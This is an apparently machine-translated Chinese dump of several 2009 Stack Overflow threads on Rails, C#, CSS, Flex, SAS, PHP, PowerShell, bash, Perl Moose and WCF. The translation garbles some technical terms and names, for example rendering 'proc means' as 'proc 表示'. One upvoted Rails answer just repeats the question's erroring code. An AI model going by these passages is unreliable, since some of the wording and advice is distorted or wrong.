我看到了类似 'find (:all, :limit=>5, :include=>[:games,:stage])' 的语法，但它返回了重复项。

谢谢...

编辑：感谢混乱的伟大回应。你让我非常接近，但我仍然需要返回是有效的请求对象：在请求的行中不同的前 5 条记录。我可以在构建时使用 find，然后对表中与第一个 find 返回的每个集合匹配的第一行进行第二个 find。

编辑：

```
Games.find(
    :all, :limit => 5,
    :include => [:games, :requests],
    :group => 'games, whatever, whatever_else'
) 
```

...给出一个 SQL 错误：

```
Mysql::Error: Unknown column 'games' in 'group statement': SELECT * FROM `games`  GROUP BY games 
```

我对我认为对我的项目正确的内容进行了一些更改；获取请求列表而不是游戏等：

```
Request.find(
    :all, :order=>"id DESC", :limit=>5,
    :include=>[:games],   #including requests here generates an sql error
    :group=>'games, etc'  #mysql error:  games isn't an attribute of requests
    :conditions=>'etc'
) 
```

我想我将不得不在这里使用 :join=> 选项。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-03-16T17:00:28.823

```
Games.find(
    :all, :limit => 5,
    :include => [:games, :requests],
    :group => 'games, whatever, whatever_else'
) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-10-10T22:59:14.160

试试 Rails uniq_by。它也适用于关联并返回数组。

`@document = Model.uniq_by(&:field)`

更多[细节](http://www.brownwebdesign.com/blog/2012/12/rails-uniq_by-unique-results-from-activerecord-relations/ "uniq_by 指南")

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:49:20.130

我认为您可以使用 find_by_sql 和 GROUP BY 来做到这一点：

```
Games.find_by_sql("SELECT * FROM games GROUP BY user_id") 
```

# c# - 调用方法组

> ID：651182
> 
> 赞同：0
> 
> 时间：2009-03-16T16:35:28.743
> 
> 标签：c#, .net, methods, delegates

我有一个方法组，其中包含以下元素：

```
class Foobar
{
    public static DataSet C(out string SpName)
    {
        SpName = "p_C";
        return null;
    }

    public static DataSet C()
    {
        string SpName;
        C(out SpName);
        return DataAccess.CallSp( SpName);

    }
} 
```

而我想做的是

```
 ButtonC.Text = DataAccess.GetSpName(**?????** Foobar.C ) 
```

我想做这个动作的地方：

```
 public string GetSpName(**(?????)** method)
 {
     string spName = string.Empty;
     method(out spName);
     return spName;
 } 
```

我尝试了各种项目作为????? 没有成功。我错过了一些要点:-(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T16:39:58.267

您需要声明一个[`delegate`](http://msdn.microsoft.com/en-us/library/900fyy8e.aspx)：

```
// A delegate that matches the signature of
// public static DataSet C      (out string SpName)
public delegate  DataSet GetName(out string name);

public class DataAccess
{
   // ...

   static public string GetSpName(GetName nameGetter)
   {
       // TODO: Handle case where nameGetter == null
       string spName;
       nameGetter(out spName);
       return spName;
   }

   // ...
}

// ...

public void SomeFunction()
{
    // Call our GetSpName function with a new delegate, initialized
    // with the function "C"
    ButtonC.Text = DataAccess.GetSpName(new GetName( Foobar.C ))
} 
```

# css - CSS 中的 margin-top 属性

> ID：651183
> 
> 赞同：-1
> 
> 时间：2009-03-16T16:35:36.717
> 
> 标签：css, internet-explorer, margin

为什么margin-top值在IE中不起作用？

在 FF 和 Safari 中运行良好。这是[链接](http://wms-clients.com/psc/andrew_test/index.html)

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T16:39:42.103

*   [折叠边距](http://reference.sitepoint.com/css/collapsingmargins)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T16:41:17.950

我看到你的#papertop 是空的。尝试添加一些   里面看看是否能解决问题。

**编辑：算了；这不起作用。**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:50:35.307

对于一个快速的解决方法，这将达到同样的效果。

```
#papertop {
background:transparent url(images/paper_top.png) no-repeat scroll right bottom;
height:250px;
position:relative;
z-index:300;
} 
```

# apache-flex - flex 肥皂 1.2 网络服务

> ID：651189
> 
> 赞同：0
> 
> 时间：2009-03-16T16:36:47.447
> 
> 标签：apache-flex, soap

我想连接到一个soap 1.2 web 服务。我知道如何使用soap 1.1 连接来做到这一点。但它不适用于肥皂 1.2。谁能告诉我是否有解决我的问题的方法？恕我直言，JSMB

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T16:41:40.117

我不认为 Flex/AS3 支持 SOAP 1.2。请参阅[文档](http://livedocs.adobe.com/flex/3/html/help.html?content=data_access_3.html)：

> Flex Web 服务 API 通常支持简单对象访问协议 (SOAP) 1.1、XML Schema 1.0（版本 1999、2000 和 2001）和 WSDL 1.1 RPC 编码、RPC 文字和文档文字（裸和包装样式参数）。两种最常见的 Web 服务类型使用远程过程调用 (RPC) 编码或文档文字 SOAP 绑定；术语编码和文字指示服务使用的 WSDL 到 SOAP 映射的类型。

您可以使用类创建自己的包装器[`AbstractWebService`](http://livedocs.adobe.com/flex/3/langref/mx/rpc/soap/AbstractWebService.html)或使用类似的类（如`HTTPRequest`）进行解析。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-18T15:19:22.740

谢谢，我现在有一个工作版本，我使用了一个叫 alducente 的人的网络服务器 [http://alducente.wordpress.com/2007/10/27/web-service-in-as3-release-10/](http://alducente.wordpress.com/2007/10/27/web-service-in-as3-release-10/)

# sas - 在 SAS 中，Proc Means 和 Proc Summary 有什么区别？

> ID：651197
> 
> 赞同：14
> 
> 时间：2009-03-16T16:38:45.087
> 
> 标签：sas

`Proc Means`和 和到底有什么区别`Proc Summary`？许多网站声明这两者是相同的，但除非每个都有独特的东西，否则 SAS 会创建它吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-16T17:31:27.143

我的理解是，用于生成输出数据集的 PROC Summary 代码与使用 PROC MEANS 生成输出数据集的代码完全相同。这两个过程的区别在于 PROC MEANS 默认生成**报告**，而 PROC Summary 默认生成**输出数据集**。因此，如果您希望将报告打印到列表中 - 使用 proc 意味着 - 如果您希望将信息传递给数据集以供进一步使用 - proc summary 可能是更好的选择。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-03-16T19:21:09.563

@cmjohns 给出了最大的不同......来自 SAS 讨论论坛

“在早期版本的 SAS（SAS 5 和 6）中，PROC MEANS 和 PROC Summary 是单独的过程。随着时间的推移，到版本 8，这两个过程的代码被标准化并“融合”在一起。除了 MEANS 之外，基本上没有区别在 LISTING 窗口或其他打开的目标中创建输出，而 Summary 默认情况下会创建一个输出数据集。” （使用 Proc Summary 语句中的 PRINT 选项生成输出）

检查链接[这里](http://support.sas.com/forums/thread.jspa?threadID=4920)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-04-19T02:15:36.643

我在 SAS 9.1.3 中遇到过 proc 表示存在“内存不足”问题的情况，但 proc summary 仍然可以正常运行等效请求。如果您遇到此问题，请记住一些事情。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-07-14T12:23:02.497

```
 **Proc Means** 
```

-> 默认打印输出。
-> 默认情况下给出变量名称、
标签名称（如果有）、平均值、非缺失值的数量、标准偏差、最小值和最大值。
-> 默认情况下，将所有数值
变量纳入分析。

```
 **Proc Summary** 
```

-> 默认情况下不打印输出。-> 默认情况下只给出非缺失值。-> 如果指定统计函数，则必须使用 Var 语句指定变量名称。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-04T08:48:05.873

proc 表示： 1) 默认情况下设置打印选项，显示输出。2) 省略 var 语句分析所有数值变量。

Proc Summary : 1) 默认没有设置打印选项，不显示输出。2）省略变量语句会产生一个简单的观察计数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-04-02T06:27:35.560

Proc Means requires at least one numeric variable while proc FREQ has no such limitations.

# c++ - 你能在 VS 2005 中创建一个 lib 或 dll 并与 VS 2008 链接吗

> ID：651198
> 
> 赞同：0
> 
> 时间：2009-03-16T16:38:47.927
> 
> 标签：c++, visual-c++-2005

我正在使用视觉工作室 2008 SP1。

我正在使用 MFC 创建一个桌面应用程序。

我有一个要与我的应用程序链接的库。但是，该库是在 WIN32 Visual Studio 2005 中编写的。

我在链接时遇到问题：

```
fatal error LNK1104: cannot open file 'AgentLib.lib' 
```

我想知道是不是因为我使用的是 MFC 2008 并且库是用 2005 编写和编译的？

非常感谢您的任何建议，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T16:42:21.787

这样做应该没有问题。

你可以

*   将 AgentLib.lib 所在的目录添加到项目的库目录中。
*   将 AgentLib.lib 添加到您的项目中（您可能会从 Visual Studio 收到一个询问规则的消息框，但不需要规则，它可以工作）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T21:06:57.780

确保您已在 Linker>General>Additional Library Directories 中的项目设置下添加了 lib 文件所在的路径

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:55:24.530

是的，有可能。如果您有问题，请查看[此](http://groups.google.co.in/group/boost-list/browse_thread/thread/8aa48ca7a5b92807)链接以获得一些帮助。还要检查使用 VS 2005 创建的库正在使用的任何依赖文件。

# php - PHP 4.4.8 的日期问题

> ID：651213
> 
> 赞同：0
> 
> 时间：2009-03-16T16:43:31.860
> 
> 标签：php, date, time, wordpress

上周发布了我的事件管理器插件的 2.0 测试版，它会生成事件列表。在漂浮的许多错误中，有一个我无法修复。该错误似乎只出现在使用 PHP 4.4.8 的测试人员的服务器上；在 PHP 5 上工作正常。当我尝试使用`H:i`php 时间格式时，我总是得到午夜 (00:00)。问题在于 wordpress 函数 mysql2date。此函数是日期函数的包装器。
我隔离了问题并将其插入到网站模板中：

```
echo (mysql2date("H:i", "0000-00-00 13:24:00")); 
```

结果是

```
00:00 
```

起初我认为这是一个 wordpress 错误，但后来我重写了我的函数以立即使用`date()`。结果更奇怪，我得到的不是午夜`11:59`。奇怪的是，mysql2date 和 date 似乎在插件的所有其他部分都可以正常工作。另外，正如我所说，我无法在我的服务器上重现该错误，只有 2 个用户发出信号。

既然有人问我，这是 mysql2date 代码；它是 Wordpress 的一部分：

```
/**
 * Converts MySQL DATETIME field to user specified date format.
 *
 * If $dateformatstring has 'G' value, then gmmktime() function will be used to
 * make the time. If $dateformatstring is set to 'U', then mktime() function
 * will be used to make the time.
 *
 * The $translate will only be used, if it is set to true and it is by default
 * and if the $wp_locale object has the month and weekday set.
 *
 * @since 0.71
 *
 * @param string $dateformatstring Either 'G', 'U', or php date format.
 * @param string $mysqlstring Time from mysql DATETIME field.
 * @param bool $translate Optional. Default is true. Will switch format to locale.
 * @return string Date formated by $dateformatstring or locale (if available).
 */
function mysql2date( $dateformatstring, $mysqlstring, $translate = true ) {
    global $wp_locale;
    $m = $mysqlstring;
    if ( empty( $m ) )
        return false;

    if( 'G' == $dateformatstring ) {
        return gmmktime(
            (int) substr( $m, 11, 2 ), (int) substr( $m, 14, 2 ), (int) substr( $m, 17, 2 ),
            (int) substr( $m, 5, 2 ), (int) substr( $m, 8, 2 ), (int) substr( $m, 0, 4 )
        );
    }

    $i = mktime(
        (int) substr( $m, 11, 2 ), (int) substr( $m, 14, 2 ), (int) substr( $m, 17, 2 ),
        (int) substr( $m, 5, 2 ), (int) substr( $m, 8, 2 ), (int) substr( $m, 0, 4 )
    );

    if( 'U' == $dateformatstring )
        return $i;

    if ( -1 == $i || false == $i )
        $i = 0;

    if ( !empty( $wp_locale->month ) && !empty( $wp_locale->weekday ) && $translate ) {
        $datemonth = $wp_locale->get_month( date( 'm', $i ) );
        $datemonth_abbrev = $wp_locale->get_month_abbrev( $datemonth );
        $dateweekday = $wp_locale->get_weekday( date( 'w', $i ) );
        $dateweekday_abbrev = $wp_locale->get_weekday_abbrev( $dateweekday );
        $datemeridiem = $wp_locale->get_meridiem( date( 'a', $i ) );
        $datemeridiem_capital = $wp_locale->get_meridiem( date( 'A', $i ) );
        $dateformatstring = ' ' . $dateformatstring;
        $dateformatstring = preg_replace( "/([^\\\])D/", "\\1" . backslashit( $dateweekday_abbrev ), $dateformatstring );
        $dateformatstring = preg_replace( "/([^\\\])F/", "\\1" . backslashit( $datemonth ), $dateformatstring );
        $dateformatstring = preg_replace( "/([^\\\])l/", "\\1" . backslashit( $dateweekday ), $dateformatstring );
        $dateformatstring = preg_replace( "/([^\\\])M/", "\\1" . backslashit( $datemonth_abbrev ), $dateformatstring );
        $dateformatstring = preg_replace( "/([^\\\])a/", "\\1" . backslashit( $datemeridiem ), $dateformatstring );
        $dateformatstring = preg_replace( "/([^\\\])A/", "\\1" . backslashit( $datemeridiem_capital ), $dateformatstring );

        $dateformatstring = substr( $dateformatstring, 1, strlen( $dateformatstring ) -1 );
    }
    $j = @date( $dateformatstring, $i );

    /*
    if ( !$j ) // for debug purposes
        echo $i." ".$mysqlstring;
    */

    return $j;
} 
```

如果你有兴趣，你可以在[这里](http://downloads.wordpress.org/plugin/events-manager.zip)下载我的插件的代码，问题在 events-manager.php 的第 613 行。

这可能与 PHP 或 apache 设置有关吗？

提前感谢您的任何建议。

戴维德

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-25T17:00:17.457

不是修复，而是替代 - 在您的 mysql 语句中使用 UNIX_TIMESTAMP 而不是之后转换它。

选择 UNIX_TIMESTAMP( `date_created`) 作为`date`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-08-12T19:15:16.630

我想我已经解决了这个问题。问题是`0000-00-00`，在某些 PHP/MySql 组合中显然不是有效的时间 mysql2date 值（很容易理解，我在看你，月份`00`...）。我最终使用`echo (mysql2date("H:i", "2000-10-10 13:24:00"));`

因为我只对小时和分钟感兴趣，所以更随意的约会可以完成这项工作。问题解决了。

# c# - 带有接口的 XmlSerialisation 策略？

> ID：651214
> 
> 赞同：0
> 
> 时间：2009-03-16T16:43:39.270
> 
> 标签：c#, xml-serialization, interface

我现在有一个两个类实现的接口。这些类的数据是从 xml 文件中读取的。

例如

```
[Serializable]
public interface IMyInterface { }

[Serializable]
public class MyClass1 : IMyInterface { }

[Serializable]
public class MyClass2 : IMyInterface { } 
```

我想从 Xml 中推断类型，有没有办法做到这一点？

因此，例如我的 xml 看起来像这样：

```
 <meta type="MyClass1">
   <!--- Some meta data -->
 </meta> 
```

我希望能够直接从 xml 序列化为对象。目前我正在手动处理xml。

编辑：澄清一下，我知道如何序列化，但我无法在不知道它是第一个类型的情况下重新序列化。我应该读取类型属性然后基于它进行序列化吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T17:19:21.087

如果您使用的是 XmlSerializer，则可以添加[XmlIncludeAttribute](http://msdn.microsoft.com/en-us/library/system.xml.serialization.xmlincludeattribute(VS.80).aspx)以指定可以反序列化的派生类。但问题是你必须将它添加到**基**类中：

```
[XmlInclude(typeof(DerivedClass))]
public abstract class BaseClass
{
    public abstract bool Property { get; set; }
}

public class DerivedClass : BaseClass
{
    public override bool Property { get; set; }
} 
```

其他方法是为可以派生的成员实现 IXmlSerializable，然后为基于属性的派生类创建一个工厂（或者您现在正在做什么？）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:25:14.477

XML 序列化器不适用于这种情况。它用于序列化可以映射到由 XML Schema 描述的 XML 的对象。

另一方面，运行时序列化包括一个 SOAP 格式化程序，它可以序列化对象，包括它们的 .NET 类型的详细信息。WCF 中的 NetDataContractSerializer 也可以。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T17:43:50.890

如果我正确理解您的查询...

在你的界面中有一个属性，比如说

```
[Serializable]
public interface IMyInterface 
{ 
 YourClassDifferentiatorEnum ObjectDifferentiator { get;  set; }
} 
```

并让每个类用不同的枚举值设置这个值。将这些具体类序列化为 XML。

当您想要反序列化（XML 返回具体对象）时，将其反序列化为`IMyInterface`，检查对象区分符，并进行相应的转换。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-03-16T16:53:49.747

我不知道这是否有帮助，但它就在这里......

如果你在返回类型名的类上放置一个公共属性怎么办

```
[XmlAttribute]
public string Type {
    get { return GetType().Name; }
} 
```

# c# - 在 Panel 上使用 C# WinForms Designer 而不是 Form？

> ID：651216
> 
> 赞同：4
> 
> 时间：2009-03-16T16:44:07.820
> 
> 标签：c#, winforms, user-interface, gui-designer

警告：我是 C# 中 GUI 构建的新手（来自 Java 中使用 Swing 和 SWT 的悠久历史。）

使用 VS2008，当我创建一个新类并扩展`System.Windows.Forms.Form`时，WinForms Designer 工作得非常好。然而; 当我创建一个新类并扩展`System.Windows.Forms.Panel`时，设计器的工作几乎没有那么优雅 - 它只是显示面板中包含的组件的某种抽象的列表类型视图（而不是显示控件中的实际布局）控制板。）

有没有办法让设计师更好地使用面板？

或者是否有一些解决方法，以便我可以与设计器一起构建一个表单，然后将其用作一个面板？

我真正在寻找的是我可以与设计器一起构建的一些 UI“元素”，然后动态地（阅读：以编程方式）将该“元素”添加/删除到更大的 UI。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-03-16T16:46:25.177

我认为您正在寻找的是[UserControl](http://msdn.microsoft.com/en-us/library/system.windows.controls.usercontrol(VS.95).aspx)。你可以直接继承，你应该能够使用设计器在上面拖放东西。

为了使它更容易，您只需右键单击您的项目，然后单击添加 -> 用户控件。这将为您创建 .cs 文件以及设计器生成的代码的部分 .cs 文件。

# command-line - PowerShell - 启动进程和命令行开关

> ID：651223
> 
> 赞同：84
> 
> 时间：2009-03-16T16:46:16.487
> 
> 标签：command-line, powershell, start-process

我可以很好地运行：

```
$msbuild = "C:\WINDOWS\Microsoft.NET\Framework\v3.5\MSBuild.exe" 
start-process $msbuild -wait 
```

但是当我运行这段代码（如下）时，我得到一个错误：

```
$msbuild = "C:\WINDOWS\Microsoft.NET\Framework\v3.5\MSBuild.exe /v:q /nologo" 
start-process $msbuild -wait 
```

有没有办法可以使用启动过程将参数传递给 MSBuild？我愿意不使用启动进程，我使用它的唯一原因是我需要将“命令”作为变量。

当我有
C:\WINDOWS\Microsoft.NET\Framework\v3.5\MSBuild.exe /v:q /nologo 单独
一行时，如何在 Powershell 中处理？

我应该改用某种 eval() 函数吗？

* * *

## 回答 #1

> 赞同：129
> 
> 时间：2009-03-16T17:07:28.653

你会想把你的论点分成单独的参数

```
$msbuild = "C:\WINDOWS\Microsoft.NET\Framework\v3.5\MSBuild.exe"
$arguments = "/v:q /nologo"
start-process $msbuild $arguments 
```

* * *

## 回答 #2

> 赞同：65
> 
> 时间：2009-03-16T17:10:00.283

使用显式参数，它将是：

```
$msbuild = 'C:\WINDOWS\Microsoft.NET\Framework\v3.5\MSBuild.exe'
start-Process -FilePath $msbuild -ArgumentList '/v:q','/nologo' 
```

编辑：引号。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-01-08T19:04:06.910

警告

如果您从 Powershell 创建的 cmd.exe 窗口运行 PowerShell，则第二个实例不再等待作业完成。

```
cmd>  PowerShell
PS> Start-Process cmd.exe -Wait 
```

现在从新的 cmd 窗口，再次运行 PowerShell 并在其中启动第二个 cmd 窗口：cmd2> PowerShell

```
PS> Start-Process cmd.exe -Wait
PS> 
```

PowerShell 的第二个实例不再支持 -Wait 请求，并且所有后台进程/作业都返回“已完成”状态，即使它们仍在运行！

当我的 C# Explorer 程序用于打开 cmd.exe 窗口并从该窗口运行 PS 时，我发现了这一点，它也忽略了 -Wait 请求。似乎任何属于 cmd.exe 的“win32 作业”的 PowerShell 都无法满足等待请求。

我在 Windows 7/x64 上使用 PowerShell 3.0 版遇到了这个问题

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2011-08-30T06:53:05.833

我发现使用 cmd 作为一种替代方法效果很好，尤其是当您需要从被调用应用程序传输输出时（特别是当它没有内置日志记录时，与 msbuild 不同）

`cmd /C "$msbuild $args" >> $outputfile`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-22T06:17:52.347

除非 OP 使用 PowerShell 社区扩展，它确实提供了 Start-Process cmdlet 以及其他一些。如果是这种情况，那么 Glennular 的解决方案会奏效，因为它匹配 pscx\start-process 的位置参数：-path (位置 1) -arguments (位置 2)。

# database - 同步来自不同应用程序的数据实体

> ID：651228
> 
> 赞同：1
> 
> 时间：2009-03-16T16:48:07.950
> 
> 标签：database, synchronization, biztalk

我正在寻找一些关于解决我所负责的问题的最佳方法的反馈。有两个系统拥有自己的数据库，存储非常相似的业务实体。

对于所讨论的每个实体，都需要有一个同步机制，以确保一个数据库中的更改在发生更改时传递给另一个数据库，并将更改转换为目标表结构。这种翻译意味着复制不是一种选择，但我不想开始编写定制的触发器或视图等来保持它们同步。

这是 BizTalk 或类似产品在初始配置/映射过程后可以处理的事情吗？另外，Biztalk 是否可能会矫枉过正，我是否可以使用其他方法来实现这一目标？

谢谢，

布赖恩。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T17:23:12.967

这取决于要同步的“系统”（表？）的大小。

EAI 是执行此操作的通用应用程序。连接两个无法交互的系统，有效地将一个业务对象映射到另一个业务对象，使用映射将一个业务对象转换为另一个业务对象。但是这样的工具（例如 webMethods ）是企业工具，如果你只需要从两个系统同步两个表，EAI 显然是矫枉过正的。

无论如何，这些原则可以帮助你。EAI 方法是拥有一个通用业务对象，该对象与您想要同步的业务对象在两个系统中找到的所有属性相匹配。然后，您将必须有某种映射来将每个特定于应用程序的业务对象与您的通用业务对象进行转换。您的对象不仅应该描述业务数据，还应该描述要执行的操作（创建、更新、删除数据）。

然后，您需要一个触发器（或两个，如果您想同步两种方式）来检测何时发生更改，使用映射将触发器获取的数据转换为通用对象（在另一端执行操作）。

最后，您需要一个“更新程序”，它将获取特定的业务对象并在数据库中执行正确的操作（插入/更新/删除）

EAI 提供连接器来处理触发工作流和更新数据库。您仍然需要根据所使用的 EAI 以某种特定方式定义一些映射。EAI 比仅仅同步两个表要强大得多。连接器有多种类型，可以与各种系统（专有的）、各种数据库、简单格式（xml、文本）或特定协议（ftp、webservices 等）交互。EAI 还确保最终有效地提交任何修改。

希望能帮助到你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-21T21:08:07.253

[Sql Server 集成服务](http://msdn.microsoft.com/en-us/library/ms141026.aspx)可能是解决问题的一个廉价候选者（可以连接到 Sql Server 的其他数据库和数据源）。SSIS 是所有 Sql Server 安装的一部分（Express 除外）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-24T17:54:34.167

BizTalk is and would be an ideal solution for this kind of problem.

What BizTalk can do? 1\. Define a schema which represents a common business entity, this is essentially all the fields which need to be in sync across several database tables.

2.  Define the flow of communication (Orchestrations) and end-points(web services), i.e. which update triggers what changes!

3.  Use maps to map the common business entity into specific data elements required by the databases. Note that biztalk has built-in adapters to speed up the development process.

4.  Adequate time must be spent in design and of this system the results would be fabulous.

For development purposes refer my articles (google keywords: Biztalk + Karamchetti)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T16:57:52.730

瑞士公司 Sowatec有一个名为“ [datariver](http://www.sowatec.com/index.php?id=108) ”的漂亮工具（几年前我在那里工作过。不过我没有参与这个产品；你知道的）。它旨在将数据从源流到汇（就像河流一样）。

该网站是德语的，但它背后的人很乐意通过邮件用英语回答您的任何问题。

# flex3 - 使用嵌套中继器的 flex 3

> ID：651234
> 
> 赞同：1
> 
> 时间：2009-03-16T16:49:52.360
> 
> 标签：flex3, nested-repeater

我正在尝试使用嵌套中继器循环遍历数组集合的行；

```
<mx:Repeater id="rp1" dataProvider="{arrayCollection}">
    <mx:Repeater id="rp2" dataProvider="{rp1.currentItem}">
        <mx:Button height="49" width="50" label="{rp2.currentItem.name}" /> 
    </mx:Repeater>
</mx:Repeater> 
```

我试图做的是让中继器循环遍历 currentRow 中的所有属性，例如。姓名、年龄、地址等。目前我所做的只是调用 rp2.currentItem.name 显式调用属性的名称，然后返回值。

是否可以使用嵌套中继器而不是明确命名属性来循环遍历它们并为每个属性显示按钮？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T16:56:56.227

你想为你`Repeater`的所有对象一个单一的`ArrayCollection`吗？使用自定义组件。

# perl - 驼鹿还是 Meta？

> ID：651237
> 
> 赞同：6
> 
> 时间：2009-03-16T16:50:44.497
> 
> 标签：perl, moose

我一直在尝试以多种方式做到这一点，但它们似乎都不够优雅。（我也想知道 CPAN 或 Moose 是否已经有了这个。随着时间的推移，我进行的数十次搜索都没有显示出完全匹配的内容。）

我想创建一种类

*   是其他类的 Base + Facade + Factory，它们将自身加载为目标类型。
*   “工厂”是公正`Base->new( %params )`的，它根据各个子类注册的策略创建类型。
*   每个子类都知道有关Base 类*域*的基本信息，但我试图将其保持在最低限度。看下面的例子：`UnresolvedPath`只知道我们应该首先检查是否存在。

最明显的例子是文件系统目录和文件：

```
package Path;
use Moose;

...

sub BUILD { 
    my ( $self, $params ) = @_;
    my $path = $params->{path};

    my $class_name;
    foreach my $test_sub ( @tests ) { 
        $class_name = $test_sub->( $path );
        last if $class_name;
    }
    croak "No valid class for $path!" unless defined $class_name;
    $class_name->BUILD( $self, $params );
}

package Folder; 
use Moose;

extends 'Path';

use Path register => selector => sub { -d $_[0] };

sub BUILD { ... }

package UnresolvedPath; 

extends 'Path';

use Path register position => 1, selector => sub { !-e $_[0] }; 
```

*   问题：Moose 是否为此提供了一个优雅的解决方案？还是我必须进入 Class::MOP 才能批量购买？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T17:37:33.323

查看[http://code2.0beta.co.uk/moose/svn/MooseX-AbstractFactory/](http://code2.0beta.co.uk/moose/svn/MooseX-AbstractFactory/)并随意窃取。（矿。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T17:01:35.000

如果你真的想做[构建器模式](http://en.wikipedia.org/wiki/Builder_pattern)或[抽象工厂模式](http://en.wikipedia.org/wiki/Abstract_factory_pattern)，那么你可以这样做，没有什么能阻止你。但也许你真正需要的是[控制反转](http://martinfowler.com/articles/injection.html)/[依赖注入](http://en.wikipedia.org/wiki/Dependency_injection)？为此，您可以查看[面包板](http://search.cpan.org/~stevan/Bread-Board-0.03/lib/Bread/Board.pm)

# bash - 变量内的环境变量

> ID：651242
> 
> 赞同：4
> 
> 时间：2009-03-16T16:52:42.760
> 
> 标签：bash, shell, environment-variables

我有一个名为的环境变量`$TEST`，它引用我的 bash 脚本中的一个目录我有一个名为的变量`$VARTEST`，它是 `$TEST/dir/file`

现在我想 grep 指定的文件，`$VARTEST`所以我尝试这样做：
`grep somestring $VARTEST`但它不会转换`$TEST`为它的目录

我尝试了 , 的不同组合，`{}`但没有成功`""``''`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T17:10:01.127

我想你想要

```
eval grep somestring "$VARTEST" 
```

甚至

```
VARTEST_EVALUATED=$(eval echo $VARTEST)
grep "$SOMESTRING" "$VARTEST_EVALUATED" 
```

但请记住（正如其他人已经说过的）：如果可能，请使用

```
VARTEST="$TEST/foo/bar" 
```

代替

```
VARTEST='$TEST/foo/bar' 
```

仅当您确实需要某种“惰性评估”时才使用第二个...

警告，如果`$VARTEST`包含恶意代码，这可能会很危险。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:15:28.493

你有没有在某事周围加上单引号？单引号将阻止变量被翻译成它们对应的值。双引号会起作用。例如：

```
#!/bin/sh

TEST="/etc"
VARTEST="$TEST/passwd"
grep "$LOGNAME" "$VARTEST" 
```

# java - 在 Java 中读取 Microsoft Access 文件

> ID：651243
> 
> 赞同：8
> 
> 时间：2009-03-16T16:53:40.433
> 
> 标签：java, jdbc, ms-jet-ace

如何在 Java 中读取（和写入）MS Access 文件 (.mdb)？是否有任何用于 MS Access 的开源 jdbc 驱动程序？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-03-16T17:06:48.637

您可以使用开源的[Jackcess](http://jackcess.sourceforge.net/)库通过 Java 读取 Access 数据库（目前支持 Access 2000-2007 版本）。

# wcf - WCF FaultContract 以及故障类的放置位置（创建使用一个 FaultContract 的多个服务）

> ID：651261
> 
> 赞同：1
> 
> 时间：2009-03-16T16:58:40.327
> 
> 标签：wcf, .net-3.5

我对 WCF 相当陌生，并且已经创建了一些服务，所以我对 WCF 有一些经验。我想创建可以使用单个 FaultContract 的多个服务。我注意到故障类型需要在同一个项目中才能使用 [DataContract] 和成员属性。这是真的还是我可以做些什么来添加合同？这是我想做的事情：

命名空间服务1{

```
 [ServiceContract()]
 iService1Interface1{
      [OperationContract()]
      [FaultContract(typeOf(ServiceFault.Fault)]
      DoTheWork1();
 } 
```

}

命名空间服务2{

```
 [ServiceContract()]
 iService1Interface2{
      [OperationContract()]
      [FaultContract(typeOf(ServiceFaults.Fault)]
      DoTheWork2();
 } 
```

}

NameSpace ServiceFaults{ [DataContract] public class Fault{ public Fault(message){ //构建消息
}

```
 [DataMember]
        public Message{}
   } 
```

}

这有意义吗？谢谢

丹尼尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T19:02:39.030

我以为我的项目中引用了 System.Runtime.Serialization，但它不存在。真是愚蠢！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T17:36:19.753

我不认为它需要在同一个项目中。项目是 Visual Studio 的东西，而不是 .NET 的东西。

当您使用单独的项目时会发生什么？您是否指定包括命名空间在内的类型？您是否引用了包含故障合同的程序集？

# performance - soCaseInsensitive 对 TdxMemDataset 上的 TdxMemIndex 的性能有很大影响吗？

> ID：651264
> 
> 赞同：0
> 
> 时间：2009-03-16T16:59:44.847
> 
> 标签：performance, delphi, devexpress, delphi-2007

我正在向我的 DevExpress **TdxMemDataset**添加一些索引以提高性能。TdxMemIndex具有*包含 soCaseInsensitive***选项**的*SortOptions*。我的数据通常是 GUID 字符串，因此不区分大小写。我想知道我是否最好将所有数据强制为相同的大小写，或者*soCaseInsensitive*标志和使用*loCaseInsensitive*标志并调用 Locate 只会有轻微的性能损失（大约等于每次转换我的字符串的大小写）我需要使用索引）。

